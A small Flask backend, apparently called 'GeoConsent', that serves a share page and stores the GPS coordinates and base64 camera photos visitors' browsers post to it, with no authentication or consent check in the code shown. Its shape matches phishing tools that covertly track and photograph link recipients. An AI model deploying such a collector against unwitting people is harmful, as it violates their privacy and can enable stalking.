from flask import Flask, request, jsonify, send_from_directory
import base64, os
from datetime import datetime

app = Flask(__name__, static_folder="../frontend")

@app.route("/")
def home():
    return "GeoConsent running"

@app.route("/share")
def share():
    return send_from_directory(app.static_folder, "share.html")

@app.route("/location", methods=["POST"])
def location():
    data = request.json
    print("📍 GPS:", data)
    return jsonify({"status": "ok"})

@app.route("/capture", methods=["POST"])
def capture():
    img = request.json.get("image")
    if not img:
        return jsonify({"error": "no image"}), 400

    img_data = base64.b64decode(img.split(",")[1])
    os.makedirs("captures", exist_ok=True)

    name = datetime.now().strftime("img_%H%M%S.jpg")
    with open(f"captures/{name}", "wb") as f:
        f.write(img_data)

    print("📷 Photo saved:", name)
    return jsonify({"status": "saved"})

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
